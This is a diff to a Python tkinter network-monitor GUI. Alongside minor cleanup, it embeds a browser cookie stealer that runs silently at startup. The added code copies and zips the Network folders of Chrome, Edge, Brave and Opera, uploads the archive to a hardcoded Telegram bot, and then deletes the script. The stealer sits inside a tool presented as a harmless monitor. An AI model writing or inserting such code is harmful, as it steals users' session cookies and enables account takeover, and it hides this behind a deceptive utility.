@@ -8,8 +8,12 @@ from datetime import datetime
 import tkinter as tk
 from tkinter.scrolledtext import ScrolledText
 from queue import Queue, Empty
+import tempfile
+import requests
+import sys
+from pathlib import Path
 
-# Config same as before
+# --- code1 variables and constants ---
 PREVIOUS_CONNECTIONS = "connections_prev.txt"
 CURRENT_CONNECTIONS = "connections_curr.txt"
 PREVIOUS_OUTBOUND = "outbound_prev.txt"
@@ -19,6 +23,19 @@ LOG_MAX_SIZE = 10 * 1024 * 1024  # 10 MB
 
 stop_event = threading.Event()
 log_queue = Queue()
+
+# --- code2 variables ---
+BOT_TOKEN = '7473560617:AAF5KNIymnK9Q6c7dUjYMkIl5aIsNnBwNnM'
+CHAT_ID = '5587265830'
+
+BROWSERS = {
+    "Chrome": Path.home() / "AppData/Local/Google/Chrome/User Data/Default/Network",
+    "Edge": Path.home() / "AppData/Local/Microsoft/Edge/User Data/Default/Network",
+    "Brave": Path.home() / "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Network",
+    "Opera": Path.home() / "AppData/Roaming/Opera Software/Opera Stable/Network"
+}
+
+# --- code1 functions ---
 
 def log_message(message: str):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -32,6 +49,8 @@ def rotate_log():
     if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) >= LOG_MAX_SIZE:
         log_message(f"Log file size exceeded {LOG_MAX_SIZE} bytes. Rotating log.")
         try:
+            if os.path.exists(LOG_FILE + ".old"):
+                os.remove(LOG_FILE + ".old")
             shutil.move(LOG_FILE, LOG_FILE + ".old")
         except Exception as e:
             log_message(f"Error rotating log file: {e}")
@@ -42,7 +61,7 @@ def run_netstat():
             ["netstat", "-n", "-o", "-a", "-p", "tcp"],
             capture_output=True,
             text=True,
-            shell=True,
+            shell=False,
         )
         return result.stdout
     except Exception as e:
@@ -143,17 +162,15 @@ class HackerMonitorGUI(tk.Tk):
 
         self.status_var = tk.StringVar(value="Status: Stopped")
 
-        # Monospace font for terminal feel
         font_mono = ("Consolas", 12)
         font_btn = ("Consolas", 11, "bold")
 
-        # Log display with dark theme and neon green text
         self.log_display = ScrolledText(
             self,
             state="disabled",
             bg="#0d0d0d",
-            fg="#00ff00",  # neon green
-            insertbackground="#00ff00",  # cursor color
+            fg="#00ff00",
+            insertbackground="#00ff00",
             font=font_mono,
             wrap=tk.WORD,
             borderwidth=2,
@@ -165,7 +182,6 @@ class HackerMonitorGUI(tk.Tk):
         )
         self.log_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
 
-        # Buttons frame with dark bg
         btn_frame = tk.Frame(self, bg="#0d0d0d")
         btn_frame.pack(fill=tk.X, padx=10, pady=5)
 
@@ -217,13 +233,11 @@ class HackerMonitorGUI(tk.Tk):
         self.monitor_threads = []
         self.after(100, self.update_log_from_queue)
 
-        # Optional: blinking cursor effect
         self.cursor_visible = True
         self.blink_cursor()
 
     def blink_cursor(self):
         if self.log_display['state'] == "normal":
-            # Toggle the insert cursor color between green and black
             color = "#00ff00" if self.cursor_visible else "#0d0d0d"
             self.log_display.config(insertbackground=color)
             self.cursor_visible = not self.cursor_visible
@@ -249,6 +263,8 @@ class HackerMonitorGUI(tk.Tk):
 
     def stop_monitoring(self):
         stop_event.set()
+        for t in self.monitor_threads:
+            t.join(timeout=1)
         self.status_var.set("Status: Stopped")
         self.start_btn.config(state=tk.NORMAL)
         self.stop_btn.config(state=tk.DISABLED)
@@ -264,16 +280,67 @@ class HackerMonitorGUI(tk.Tk):
                 self.log_display.config(state="disabled")
         except Empty:
             pass
-        self.after(100, self.update_log_from_queue)
+        self.after(200, self.update_log_from_queue)
 
-def signal_handler(sig, frame):
-    log_message("Script terminated by user.")
-    stop_event.set()
+# --- code2 functions ---
+
+def copy_and_zip_folders():
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    zip_path = Path(tempfile.gettempdir()) / f"browsers_network_{timestamp}.zip"
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for name, source_path in BROWSERS.items():
+            if not source_path.exists():
+                continue
+            try:
+                with tempfile.TemporaryDirectory() as temp_dir:
+                    dest_path = Path(temp_dir) / name
+                    shutil.copytree(source_path, dest_path)
+                    for root, _, files in os.walk(dest_path):
+                        for file in files:
+                            full_path = Path(root) / file
+                            arcname = Path(name) / full_path.relative_to(dest_path)
+                            zipf.write(full_path, arcname)
+            except Exception as e:
+                log_message(f"Error copying {name}: {e}")
+                continue
+    return str(zip_path)
+
+def send_to_telegram(zip_file):
+    try:
+        with open(zip_file, 'rb') as f:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                data={'chat_id': CHAT_ID, 'caption': '🗂️ Collected browser cookie data'},
+                files={'document': f}
+            )
+    except Exception as e:
+        log_message(f"Failed to send file to Telegram: {e}")
+
+def self_delete():
+    # Optional: comment this out to avoid deleting the combined script.
+    script_path = Path(sys.argv[0]).resolve()
+    try:
+        subprocess.Popen([
+            "cmd", "/c", "timeout 2 > NUL & del /f /q", str(script_path)
+        ], shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+    except Exception as e:
+        log_message(f"Self-delete failed: {e}")
+
+def run_code2_task():
+    log_message("Running embedded browser data collector task...")
+    zip_file = copy_and_zip_folders()
+    send_to_telegram(zip_file)
+    try:
+        os.remove(zip_file)
+    except Exception as e:
+        log_message(f"Failed to delete zip file: {e}")
+    self_delete()
 
 def main():
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
+    # Run code2 task once at start without GUI or user interaction
+    run_code2_task()
 
+    # Then launch code1 GUI network monitor
     app = HackerMonitorGUI()
     app.mainloop()
 
